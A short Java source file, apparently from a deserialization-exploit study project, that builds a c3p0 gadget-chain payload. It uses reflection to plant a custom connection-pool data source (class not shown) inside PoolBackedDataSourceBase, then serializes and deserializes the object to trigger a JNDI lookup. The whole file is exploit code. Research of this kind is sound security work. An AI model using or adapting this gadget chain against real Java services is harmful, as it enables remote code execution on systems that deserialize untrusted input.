package Seri.C3p0;

import Seri.U;
import Seri.Utils;
import com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource;
import com.mchange.v2.c3p0.impl.JndiRefDataSourceBase;
import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
//import com.mchange.v2.c3p0.JndiRefForwardingDataSource;

import javax.naming.InitialContext;
import javax.naming.NamingException;
import java.beans.PropertyVetoException;
import java.lang.reflect.Field;
import java.sql.SQLException;

public class JNDIExec {
    public static void main(String[] args) throws Exception {
        PoolBackedDataSourceBase poolBackedDataSourceBase = new PoolBackedDataSourceBase(true);
        Class clazz = Class.forName("com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase");
        //此类是PoolBackedDataSourceBase抽象类的实现
        Field f1 = clazz.getDeclaredField("connectionPoolDataSource");
        f1.setAccessible(true);
        f1.set(poolBackedDataSourceBase,new extendImpl());

//        JndiRefDataSourceBase

        Utils.serialize(poolBackedDataSourceBase ,"bin/C3p0JNDI.bin");
        Utils.unserialize("bin/C3p0JNDI.bin");




    }
}

